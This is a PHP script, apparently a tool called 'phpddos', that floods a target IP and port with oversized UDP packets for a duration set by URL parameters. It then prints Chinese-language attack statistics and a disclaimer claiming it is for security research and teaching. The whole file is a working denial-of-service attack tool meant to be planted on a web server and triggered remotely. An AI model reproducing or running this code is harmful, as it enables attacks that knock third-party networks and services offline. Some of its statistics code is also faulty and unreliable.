<?php
$packets = 0;
$ip = $_GET['ip'];
$port = $_GET['port'];
set_time_limit(0);
ignore_user_abort(FALSE);
$exec_time = $_GET['time'];
$time = time();
print "状态 : 正常运行中.....<br>";
$max_time = $time+$exec_time;
for($i=0;$i<65535;$i++){
        $out .= "phpddos";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
 
        $fp = fsockopen("udp://$ip", $port, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "================================================<br>";
echo "  <font color=blue>www.phpddos.com<br>";
echo "  作者：ybhacker<br>";
echo "  警告：本程序带有攻击性,仅供安全研究与教学之用,风险自负!</font><br>";
echo "================================================<br><br>";
echo "  攻击包总数：<font color=Red><span class=\"text\">".$packets." 个数据包</span><br><br></font>";
echo "	攻击总流量：<font color=Red><span class=\"text\">".round(($packets*65*8)/(1024*1024),2)." Mbps</span><br><br></font>";
echo "  攻击总字节：<font color=Red><span class=\"text\">".time('h:i:s')." 字节</span><br><br></font>";
echo "Packet complete at ".time('h:i:s')." with $packets (" .round(($packets*65*8)/(1024*1024),2). " Mbps) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
?>